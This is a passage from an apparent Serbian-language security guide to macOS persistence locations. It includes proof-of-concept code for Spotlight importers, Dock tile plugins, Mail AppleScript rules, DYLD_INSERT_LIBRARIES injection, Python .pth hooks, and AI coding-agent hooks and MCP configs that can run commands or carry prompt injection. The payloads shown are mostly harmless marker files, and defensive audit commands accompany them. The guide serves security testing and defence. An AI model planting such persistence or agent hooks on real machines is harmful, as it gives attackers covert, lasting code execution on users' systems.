      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Ako proverite Plist drugog `mdimporter`-a, možda nećete pronaći stavku **`UTTypeConformsTo`**. To je zato što je to ugrađeni _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) i ne mora da navodi ekstenzije.
>
> Pored toga, podrazumevani sistemski dodaci uvek imaju prednost, tako da napadač može da pristupi samo datotekama koje Apple-ovi `mdimporter`-i inače ne indeksiraju.

Da biste napravili sopstveni importer, možete početi od ovog projekta: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), a zatim promeniti naziv, **`CFBundleDocumentTypes`** i dodati **`UTImportedTypeDeclarations`** kako bi podržavao željenu ekstenziju, pa ih odraziti u **`schema.xml`**.\
Zatim **promenite** kôd funkcije **`GetMetadataForFile`** tako da izvrši vaš payload kada se kreira datoteka sa obrađivanom ekstenzijom.

Na kraju, **izgradite i kopirajte novi `.mdimporter`** na jednu od tri prethodno navedene lokacije. Da biste proverili da li je učitan, možete **nadgledati logove** ili pokrenuti **`mdimport -L`**.

> [!TIP]
> Iako je sandbox importera veoma restriktivan, `mdworker` indeksira datoteke uz **privilegovani pristup za čitanje**. Zlonamerni `.mdimporter` zato može da čita *sadržaj* datoteka na lokacijama zaštićenim TCC-om (Downloads, Pictures, Desktop, …) i da eksfiltrira prikupljene metapodatke bez ikakvog TCC upita — **TCC zaobilaznica „Sploitlight“ (CVE-2025-31199)**, zakrpljena u macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

### ~~Okno postavki~~

> [!CAUTION]
> Izgleda da ovo više ne funkcioniše.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Potrebna je određena radnja korisnika
- TCC zaobilaznica: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Opis

Izgleda da ovo više ne funkcioniše.<sup>[[26]](#references)</sup>

### Datoteke skripti aplikacija

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Međutim, ciljana aplikacija mora biti instalirana i žrtva mora da je pokrene/koristi
- TCC zaobilaznica: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

**Interpretirana skripta koju instalirana aplikacija ili alat zaista izvršava** i koju akter može da izmeni. Proverite dozvole datoteke i putanju poziva; samo pronalaženje datoteke `.sh` ili `.py` nije dovoljno. Apple-ov [vodič za potpisivanje kôda](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) navodi da potpisani paketi aplikacija zapečaćuju resurse, uključujući skripte. Izmena skripte unutar paketa narušava to zapečaćenje i može biti otkrivena ili blokirana tokom provere paketa. Spoljna skripta, kao što je pokretač Homebrew-a, ima drugačije ponašanje u pogledu potpisivanja i poverenja. Istorijski primeri iz writeup-a obuhvataju:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – skripta koju su koristile starije verzije Sublime Text-a; za instaliranu verziju treba proveriti da li datoteka postoji i da li se koristi pri pokretanju. Nije postojala na testnom Mac-u.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) ili **`/usr/local/bin/brew`** (Intel) – Bash pokretač koji se izvršava kada se pozove odgovarajuća putanja `brew`, ako je instaliran i akter može da ga menja. `/opt/homebrew/bin/brew` je na testnom Mac-u bio upisiva Bash skripta; to je lokalno zapažanje, a ne opšte pravilo o dozvolama za Homebrew.
- **`idlemain.py`** aplikacije IDLE, unutar Python paketa aplikacije – za upis može biti potrebna administratorska dozvola, ali se izvršava pod identitetom korisnika IDLE-a.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – istorijska shell skripta koja se izvršava kao root kada je instaliran odgovarajući `org.wireshark.ChmodBPF` launchd zadatak. Skripta i zadatak nisu postojali na testnom Mac-u.

#### Opis i iskorišćavanje

Neki alati i aplikacije izvršavaju interpretirane skripte tokom rada. U skriptu u koju može da se upisuje moguće je dodati komande koje će se izvršiti pri sledećem pokretanju njenog konkretnog pozivaoca, pod uslovom da provere potpisa, karantin i druge provere to dozvole. Originalno istraživanje prikazalo je nekoliko instalacija iz 2019. godine; ponovo proverite njihove putanje i okidače na ciljnoj verziji.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

This test kopiranja proizveo je `marker fired: True` na macOS 26.5.2; originalni launcher nije diran. Ovo dokazuje da se tačka umetanja izvršava u kopiji, a ne da bi izmenjeni potpisani app bundle ili stvarna Homebrew instalacija prošli sve provere pri pokretanju.

### Dock Tile Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Potrebno je da app koji navodi plug-in bude otkriven/registrovan i obrađen od strane Dock-a
  - Plug-in se učitava u **Apple-signed** helper koji nema app-sandbox entitlement i ima **library validation disabled**. Ovaj helper nije prikazan u UI-ju Background Task Management u citiranom istraživanju; vidljivost na ciljnoj verziji treba proveriti.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, naveden pomoću ključa **`NSDockTilePlugIn`** u app-ovom `Info.plist`; sopstveni `Info.plist` plug-in-a postavlja **`NSPrincipalClass`**.

#### Opis i eksploatacija

Kada app navede `NSDockTilePlugIn`, Dock može da učita navedeni bundle u XPC helper **`com.apple.dock.external.extra`** (`...extra.arm64` na Apple Silicon-u) pri prijavljivanju ili kada se njegova ikonica doda; nije neophodno da se sama app pokrene. App mora biti otkriven i registrovan, a macOS mora da ga prihvati. Helper je **Apple-signed**, nema entitlement `com.apple.security.app-sandbox` i ima `com.apple.security.cs.disable-library-validation`. Pri učitavanju se poziva metoda **`setDockTile:`** principal class-a; odatle može da se pretplati na distribuirana obaveštenja (npr. `com.apple.screenIsLocked`) za kasnije događaje.<sup>[[38]](#references)</sup>

Na macOS 26.5.2, pregled samo za čitanje pomoću `codesign` potvrdio je Apple potpis i entitlements helper-a, a nekoliko instaliranih app-ova navodilo je `NSDockTilePlugIn`. Na tom Mac-u nije instaliran niti učitan nijedan novi plug-in, pa izvršavanje novonapisanog bundle-a na toj verziji ostaje neprovereno.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Vidžeti (Notification Center / WidgetKit)

Opis: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Proširenje vidžeta radi u **sopstvenom procesu**, a njegovo dodavanje **ne** izaziva upozorenje Background Task Management
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Config plist se nalazi unutar kontejnera zaštićenog TCC-om, pa je za njegovo uređivanje spolja potreban Full Disk Access ili TCC bypass

#### Lokacija

- Paket proširenja vidžeta: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Aktivni/registrovani vidžeti: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (ključevi `widgets.instances` i `widgets.widgets`)

#### Opis i eksploatacija

Proširenje WidgetKit-a isporučeno unutar aplikacije radi u **sopstvenom procesu** kojim upravlja Notification Center. Registrovanje instance u `widgets.instances` (blob `CHSWidget` kodiran u base64 pomoću `NSKeyedArchiver`, sa ugrađenim podacima `INIntent`) i ponovno pokretanje NotificationCenter-a učitava vidžet i izvršava njegov kod `TimelineProvider`/intent.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app Rules (Run AppleScript)

Opis: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Ali Mail.app mora biti podešen sa nalogom i pokrenut; okidač je dolazna e-poruka
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)
  - Izmena pravila/skripti izvan Mail-a može zahtevati da Mail bude zatvoren i da na novijim verzijama macOS-a bude omogućen Full Disk Access

#### Lokacija

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (lokalna pravila; `V10` na Sonoma/Sequoia, `V11`+ na novijim verzijama)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (pravila sinhronizovana sa iCloud-om, imaju prednost)
- Aktivacija pravila: **`RulesActiveState.plist`**; AppleScript payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Opis i eksploatacija

Apple Mail **pravilo** može da ima akciju *"Run AppleScript"*. Dodavanjem pravila koje prepoznaje posebno sastavljen **naslov poruke** i pokreće napadačevu skriptu, napadač dobija **daljinski aktivirano, prikriveno** izvršavanje koda u kontekstu Mail-a kad god stigne odgovarajuća e-poruka — vektor koji zaobilazi mnoge skenere za otkrivanje postojanosti jer se ne kreira nijedan LaunchAgent/Login Item.<sup>[[42]](#references)</sup> Ako se pravilu podesi i da **obriše** okidačku e-poruku, tragovi se prikrivaju. Branioci mogu direktno da je traže:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Konfiguracioni profili (.mobileconfig)

Opis: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [🔴](https://emojipedia.org/large-red-circle)
  - Savremeni macOS zahteva **ručno odobrenje korisnika** u Podešavanja sistema → *Upravljanje uređajem* (tiha instalacija pomoću `profiles install` više nije moguća van MDM-a)
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Instalirani profili se nalaze u **`/Library/Managed Preferences/`** i **`/var/db/ConfigurationProfiles/`**; profil je XML plist sa nizom `PayloadContent`.

#### Opis i eksploatacija

`.mobileconfig` nije primitiv za direktno izvršavanje koda, ali može da sačuva konfiguraciju kao što su **pouzdani osnovni CA** (`com.apple.security.root`), **globalni ili PAC proxy** (`com.apple.proxy.*`), **upravljane preference** (`com.apple.ManagedClient.preferences`) ili ograničenja. Na macOS-u 10.15 i novijim verzijama, Apple-ova definicija [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel) navodi da postavljanje ove vrednosti na `true` u profilu koji je **ručno instaliran**, bez payloada za lozinku za uklanjanje, zahteva **autentifikaciju administratora** za njegovo uklanjanje; to ne čini profil apsolutno nemogućim za uklanjanje. Za profile instalirane putem MDM-a važe zasebna pravila upravljanja i uklanjanja.<sup>[[44]](#references)</sup>

> [!WARNING]
> Običan konfiguracioni profil nema **tip payloada koji postavlja proizvoljan `LaunchDaemon`/`LaunchAgent`**. Instaliranje demona na taj način zahteva potpunu **MDM registraciju** i agenta/skriptu za upravljanje — nemojte tretirati `.mobileconfig` kao mehanizam za isporuku launchd-a.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

- Korisno za zaobilaženje sandboxa: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **uklanja** `DYLD_*` za SIP/platform binarne datoteke, aplikacije sa hardened runtime-om i setuid ciljeve, pa ubacuje samo u nezaštićene procese i **ne** zaobilazi SIP/hardened runtime
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Pouzdan oblik: rečnik **`EnvironmentVariables`** unutar zlonamernog plist-a `LaunchAgent`/`LaunchDaemon` (pokreće se pri prijavi/pokretanju sistema)
- Zastarelo/istorijsko (navesti samo u izveštaju): **`~/.MacOSX/environment.plist`** (uklonjen u 10.8) i **`/etc/launchd.conf`** (uklonjen u 10.10)

#### Opis i eksploatacija

Ako napadač uspe da postavi `DYLD_INSERT_LIBRARIES` u okruženje procesa žrtve, dyld učitava napadačevu dylib (pokreće se njen konstruktor) u taj proces. U postojanom obliku, promenljiva se ugrađuje u `LaunchAgent`, tako da se pri svakom pokretanju zadatka ponovo ubacuje. Imajte na umu da se `launchctl setenv DYLD_*` filtrira u modernom macOS-u, pa je umesto toga ugradite u plist.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Za kompletan opis mehanike dylib injection/hijacking pogledajte:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLI alati AI coding agenata (hooks, MCP serveri, rules fajlovi)

Analize: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Backdoor u rules fajlu (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Zahteva da programer koristi odgovarajućeg agenta. Komande pri pokretanju izvršavaju se sa privilegijama tog korisnika kada agent prihvati njihovu konfiguraciju; poverenje u workspace i odobravanje MCP-a zavise od proizvoda i režima sesije.
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle) (izvršava se kao korisnik; nasleđuje sve privilegije koje terminal/agent već ima)

#### Lokacija

Eksplicitni konfiguracioni fajlovi za hook i MCP mogu pokrenuti **shell komande ili podređene procese kada programer koristi alat** — bilo iz globalnog fajla po korisniku (perzistencija) ili iz fajla koji je predat uz repo (supply-chain napad). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` i pravila editora predstavljaju **uputstva agentu**, a ne garantovano izvršavanje shell komandi pri čitanju; njihov efekat zavisi od ponašanja agenta i dozvola za korišćenje alata. Proverite aktuelna pravila poverenja i odobravanja za svaki proizvod.

- **Claude Code**
  - `~/.claude/settings.json`, projektni `.claude/settings.json`, `.claude/settings.local.json` i fajl **`/Library/Application Support/ClaudeCode/managed-settings.json`**, dostupan samo root-u (MDM/managed podešavanja **korisnik ne može da izmeni** → snažna perzistencija)
  - Objekat `hooks` — događaji `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — svaki pokreće shell `command`
  - `statusLine.command` — shell komanda koja se izvršava radi prikaza statusne linije (u svakoj sesiji)
  - MCP serveri u `~/.claude.json` / projektnom `.mcp.json` — `command`+`args` pokreću se kao podređeni procesi
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — uputstva koja mogu pokušati prompt injection, u zavisnosti od ponašanja agenta i dozvola za korišćenje alata
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` pokreću se kao podređeni procesi); projektna uputstva u `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP serveri); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … pokreću komande); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Opis i eksploatacija

Ako akter može da izmeni globalna podešavanja korisničkog naloga, njegovi hook ili MCP komande mogu se izvršavati u budućim sesijama tog naloga. Konfiguracija kojom upravlja repo predstavlja zaseban slučaj: [aktuelna bezbednosna dokumentacija Claude Code-a](https://code.claude.com/docs/en/security) opisuje interaktivni dijalog za poverenje u workspace i zaseban zahtev za odobrenje serverskih podešavanja projekta `.mcp.json`. [Matrica dozvola](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) navodi da hook-ovi mogu da se izvršavaju nakon što je korisnik ukazao poverenje nadređenom folderu, a sesije `claude -p`/SDK ne prikazuju interaktivni upit za poverenje; u tim neinteraktivnim režimima serverski MCP procesi projekta se povezuju bez upita za odobrenje. Zaobilaženje projektnog hook-a pre davanja poverenja, prijavljeno kao CVE-2025-59536, [otklonjeno je 2025. godine](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); nemojte smatrati da je to podrazumevano ponašanje u aktuelnim verzijama. Vektori isporuke mogu uključivati kompromitovan repo ili zlonamerni instalacioni program. Prompt injection kroz rules fajlove manje je predvidljiv nego eksplicitni hook i i dalje zavisi od odobrenja za korišćenje alata.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Primer globalnih Claude Code podešavanja korisnika; koristite ih za testiranje isključivo u nalogu namenjenom za jednokratnu upotrebu:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Primer globalne Codex MCP konfiguracije za korisnika:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Primer konfiguracije Cursor hook-a; pre upotrebe proverite šemu instalirane verzije:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Proširenja pregledača (Chromium: Chrome / Brave / Edge)

Writeup: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [zloupotreba ExtensionInstallForcelist na macOS-u](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Zahteva podržan pregledač i instalirano, omogućeno proširenje. External Extensions na macOS-u zahtevaju potvrdu korisnika; za prinudnu instalaciju putem upravljanja potrebna je odgovarajuća enterprise politika.
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Ovo se razlikuje od **native messaging hosts** (pogledajte odeljak *Chrome native messaging hosts* iznad). Ovde je postojanost u samom **automatski instaliranom proširenju**.

#### Lokacija

- **JSON datoteka za External Extensions** (otkriva se pri pokretanju pregledača, nakon čega se na macOS-u traži potvrda za omogućavanje):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (po korisniku) ili `/Library/Application Support/Google/Chrome/External Extensions/` (za sve korisnike)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Prinudna instalacija putem enterprise politike** kroz upravljane postavke / konfiguracioni profil:
  - Ključ `ExtensionInstallForcelist` u `com.google.Chrome` (`com.brave.Browser` za Brave, `com.microsoft.Edge` za Edge), čita se iz `/Library/Managed Preferences/` ili instalirane `.mobileconfig` datoteke

#### Opis i eksploatacija

Ovo su dva različita načina instalacije. Chrome-ova [dokumentacija o instalaciji spolja](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) navodi da **korisnici Windows-a i macOS-a moraju da potvrde i omoguće** proširenje ponuđeno putem datoteke *External Extensions*; ono se ne izvršava samo zato što je ta JSON datoteka upisana. Za instalaciju za sve korisnike na macOS-u, Chrome takođe zahteva da datoteka spoljnog proširenja bude zaštićena od izmena od strane neprivilegovanih korisnika. Upravljana politika `ExtensionInstallForcelist` ili `ExtensionSettings` može da instalira i zakači proširenje bez interakcije korisnika; [Google-ov vodič za Mac politike](https://support.google.com/chrome/a/answer/7517624) opisuje upravljanu konfiguraciju i navodi da korisnik ne može da ukloni prinudno instalirana proširenja. To je putanja za primenu politike, a ne prečica `defaults write` po korisniku.<sup>[[49]](#references)</sup>

> [!WARNING]
> Na macOS-u, JSON manifest *External Extensions* mora da upućuje na URL za ažuriranje **Chrome Web Store-a**, a ne na lokalni CRX. Primena upravljane politike ima zasebne enterprise preduslove i može da dozvoli upravljani, samostalno hostovan URL za ažuriranje. Za lokalno raspakovano proširenje u testnom profilu, Chrome-ov prekidač za developerski režim `--load-extension=/path` predstavlja zaseban mehanizam i ne omogućava da se JSON datoteka External Extensions sama izvršava. Ne smatrajte upisivanje u `Secure Preferences` ekvivalentom bilo kojoj od dokumentovanih metoda registracije.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Pokrenite Chrome u tom privremenom nalogu i sačekajte da se prikaže zahtev za omogućavanje; ponašanje samog proširenja predstavlja PoC izvršavanja nakon što korisnik prihvati. Nakon testa, uklonite manifest i onemogućite/deinstalirajte proširenje u tom profilu. Ovaj put nije testiran u aktivnom Chrome profilu na istraživačkom Mac računaru. Ni ruta preko upravljane politike nije tamo primenjena.

Force-install i External Extensions upućuju na ID-jeve proširenja iz **Chrome Web Store**-a; za trik nižeg nivoa kojim se lokalno proširenje neprimetno ubacuje uređivanjem HMAC-potpisanog `Secure Preferences` profila, kao i za druge vrste zloupotrebe Chromium procesa, pogledajte:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Obrađivači URL šema i tipova datoteka (LaunchServices)

Opis: [Daljinska eksploatacija Mac računara putem prilagođenih URL šema (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Okidač je da žrtva klikne na vezu (npr. u Chrome/Brave/Safari) ili otvori datoteku registrovanog tipa
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `Info.plist` paketa aplikacije koji deklariše **`CFBundleURLTypes`/`CFBundleURLSchemes`** (prilagođenu URL šemu) ili **`CFBundleDocumentTypes`** (ekstenziju datoteke/UTI)
- Efektivne podrazumevane vrednosti za korisnika mogu se nalaziti u **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (niz `LSHandlers`). Apple-ov podržani API za izbor podrazumevanog obrađivača URL šeme je `LSSetDefaultHandlerForURLScheme`; direktno upisivanje u taj plist nije dokumentovan način registracije ili ažuriranja keša.

#### Opis i eksploatacija

Launch Services preuzima tvrdnje o URL šemama i dokumentima iz `Info.plist` registrovane aplikacije. [Apple-ov vodič za registraciju](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) navodi da do registracije može doći kada Finder otkrije aplikaciju, pri pokretanju ili prijavljivanju, ili putem eksplicitnog API-ja za registraciju; samo smeštanje aplikacije na neku lokaciju ne garantuje da će se registracija odmah pokrenuti. Nakon registracije, otvaranje odgovarajuće URL adrese ili dokumenta može pokrenuti izabranu aplikaciju obrađivača, u skladu sa izborom korisnika za podrazumevanog obrađivača i uobičajenim proverenama pri pokretanju macOS-a. Podržani API `LSSetDefaultHandlerForURLScheme` menja korisnikov preferirani URL obrađivač; ne pokreće automatski novododatu aplikaciju.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Nijedna aplikacija nije registrovana niti je promenjena preferencija rukovaoca na istraživačkom Mac računaru sa macOS 26.5.2. Da biste testirali stvarnog rukovaoca, koristite jednokratni korisnički nalog, registrujte aplikaciju koja samo označava poziv i koristi jedinstvenu šemu, pozovite njen URL, a zatim uklonite aplikaciju i njenu registraciju.

Detaljnije informacije o enumeraciji/zloupotrebi rukovalaca ekstenzijama datoteka i URL šemama potražite ovde:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Python startup datoteke (`.pth` / `usercustomize` / `sitecustomize`)

Dokumentacija: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Pokreće se kada se pokrene odgovarajući Python interpreter sa omogućenim direktorijumom `site`; okidač nije univerzalan za sva virtuelna okruženja, Python buildove ili startup zastavice
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Pokreće se sa privilegijama/TCC-om procesa koji je pokrenuo interpreter

#### Lokacija

- **`$(python3 -m site --user-site)/*.pth`** (macOS framework buildovi: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Nisu potrebne root privilegije (može da ga menja korisnik)
  - **Okidač**: pokretanje tog Python builda sa omogućenim korisničkim `site` direktorijumom; modul `site` obrađuje `.pth` datoteke u aktivnim `site` direktorijumima
- **`<user-site>/usercustomize.py`**
  - Nisu potrebne root privilegije
  - **Okidač**: pokretanje sa omogućenim korisničkim `site` direktorijumom (automatski ga uvozi `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (npr. `/opt/homebrew/lib/python3.13/site-packages/` ili sistemske putanje)
  - Mogu biti potrebne root/admin privilegije, u zavisnosti od lokacije interpretera
  - **Okidač**: pokretanje interpretera koji uključuje taj `site` direktorijum

#### Opis i eksploatacija

Pri pokretanju Python obično uvozi `site` i pretražuje aktivne `site-packages` direktorijume u potrazi za `.pth` datotekama. Pored dodavanja putanja, red u `.pth` datoteci koji počinje sa `import ` izvršava Python kod čak i ako se navedeni modul inače nigde ne koristi. Python takođe pokušava da uveze `sitecustomize` i, **kada je korisnički `site` omogućen**, `usercustomize`.<sup>[[56]](#references)</sup> Okidač je kasnije pokretanje interpretera koji koristi izmenjeni direktorijum. `-S` onemogućava obradu modula `site`; `-s`, `-I` ili `PYTHONNOUSERSITE` onemogućavaju varijante koje koriste **korisnički `site`**. `-I` uglavnom ne onemogućava globalni `sitecustomize`. Virtuelna okruženja takođe mogu isključiti korisnički `site`. Proverite `python3 -m site` za konkretni interpreter.

Sledeći PoC je pokrenut na macOS 26.5.2. `PYTHONUSERBASE` premešta korisnički `site` direktorijum u privremeni direktorijum radi ovog testa; stvarni korisnički `site` direktorijum se ne menja:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
